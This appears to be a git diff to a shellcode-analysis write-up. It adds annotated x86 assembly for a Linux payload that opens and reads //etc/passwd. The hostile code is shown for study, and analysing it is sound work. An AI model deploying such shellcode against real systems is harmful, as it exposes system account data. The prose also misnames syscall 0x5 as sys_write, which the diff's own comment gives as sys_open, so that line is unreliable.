@@ -16,8 +16,8 @@ Binary ninja graph:
 
 ![graph](https://raw.githubusercontent.com/x00pwn/lowlevel-shellcode-analysis/master/graph_images/case2-graph.png)
 
-Disassembly:
 ```
+Disassembly-
 0:  31 c9                   xor    ecx,ecx
 2:  f7 e1                   mul    ecx
 4:  b0 05                   mov    al,0x5
@@ -41,4 +41,20 @@ c:  68 63 2f 70 61          push   0x61702f63
 2e: cd 80                   int    0x80
 30: 93                      xchg   ebx,eax
 31: cd 80                   int    0x80
+```
+
+Analysis:
+
+As usual, the shellcode starts by clearing out the ecx register, then it moves the linux `sys_write` syscall into the al register. Then the shellcode pushes the string `//etc/passwd` onto the stack in little endian format and split up.
+
+```assembly
+xor    ecx,ecx        ; clear out ecx as prep
+mul    ecx            ; 
+mov    al,0x5         ; linux syscall (sys_open, 0x05)
+push   ecx
+push   0x64777373     ; push 'dwss' to the stack
+push   0x61702f63     ; push 'ap/c' to the stack
+push   0x74652f2f     ; push 'te//' to the stack
+mov    ebx,esp
+int    0x80           ; sys interupt
 ```
